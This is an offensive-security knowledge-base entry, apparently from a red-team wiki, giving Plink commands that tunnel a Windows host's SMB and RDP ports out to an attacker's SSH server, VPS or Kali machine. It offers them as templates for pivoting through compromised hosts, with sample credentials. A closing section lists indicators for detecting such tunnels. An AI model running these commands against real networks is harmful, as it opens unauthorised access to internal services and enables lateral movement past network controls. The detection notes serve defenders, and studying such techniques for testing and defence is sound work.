---
id: 823bd990-977a-4542-b4e9-ef59be2ce33f
name: Plink-Port-Forwarding-Examples
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:22.999767+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - network-pivoting
  - ssh-forwarding
  - examples
validated: true
---

# Plink-Port-Forwarding-Examples

## Code

```powershell
# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
```

## Description

This code snippet provides multiple examples of Plink commands for SSH port forwarding in network pivoting scenarios. It includes comments explaining each variant, such as exposing SMB/RDP ports, local/remote forwarding, and VPS redirection. Use these as templates for creating tunnels through compromised hosts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_USERNAME | SSH username (e.g., root, user) | root |
| $_PASSWORD | SSH password | toor |
| $_SSH_SERVER_IP | IP of SSH server/pivot | ssh-server-ip |
| $_VPS_IP | VPS IP for forwarding | 203.0.113.1 |
| $_REMOTE_PORT | Port on remote side | 445 |
| $_LOCAL_PORT | Port on local side | 445 |
| $_KALI_IP | Kali pivot IP | 192.168.12.185 |

## Usage

Copy and adapt these commands in a PowerShell session on a Windows attacker machine. Run individually or script them for automation. Start with establishing credentials and IPs, then execute to create tunnels. Combine with tools like RDP clients or smbclient to interact with forwarded services. Ideal for red team operations where direct access is blocked.

## Detection

- SSH server logs showing port forwarding (-R/-L flags) or unusual binds.
- Network traffic anomalies: external IPs connecting to internal service ports via SSH hosts.
- Process monitoring for plink.exe with arguments containing -R or -pw.
- IDS alerts on compressed SSH traffic (-C) or non-standard port mappings.

## Related

- [[procedures/Network-Pivoting-with-Plink-Port-Forwarding]]
- [[tools/Plink]]
